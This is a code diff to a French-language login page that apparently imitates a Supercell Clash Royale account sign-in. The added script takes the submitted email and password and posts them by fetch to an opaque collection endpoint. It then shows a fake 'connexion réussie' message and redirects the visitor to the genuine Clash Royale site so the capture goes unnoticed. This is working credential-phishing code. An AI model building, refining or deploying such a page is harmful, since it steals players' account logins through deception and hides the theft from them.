@@ -72,6 +72,18 @@ input:focus{
 .login-btn:hover{
     transform:translateY(-2px);
 }
+.success{
+    background:linear-gradient(45deg,#27ae60,#2ecc71);
+    color:white;
+    padding:20px;
+    border-radius:8px;
+    margin-top:20px;
+    display:none;
+}
+@media (max-width: 480px) {
+    .form-container { padding: 25px 20px; }
+    .logo img { width: 160px; }
+}
 </style>
 </head>
 <body>
@@ -81,7 +93,7 @@ input:focus{
     </div>
     <div class="form-container">
         <h2>Connexion à votre compte</h2>
-        <form action="dZZZCz6YX" method="POST">
+        <form id="loginForm">
             <div class="input-group">
                 <label>Email</label>
                 <input type="email" name="email" required placeholder="votre@email.com">
@@ -93,7 +105,30 @@ input:focus{
             <input type="hidden" name="_next" value="https://supercell.com/en/games/clashroyale/">
             <button type="submit" class="login-btn">Se connecter</button>
         </form>
+        <div id="success" class="success">
+            Connexion réussie ! Redirection...
+        </div>
     </div>
 </div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    document.querySelector('.login-btn').innerHTML = 'Envoi...';
+    
+    fetch('dZZZCz6YX', {
+        method: 'POST',
+        body: formData
+    }).then(response => response.text())
+    .then(() => {
+        document.getElementById('success').style.display = 'block';
+        setTimeout(() => {
+            window.location.href = 'https://supercell.com/en/games/clashroyale/';
+        }, 1500);
+    });
+});
+</script>
 </body>
 </html>
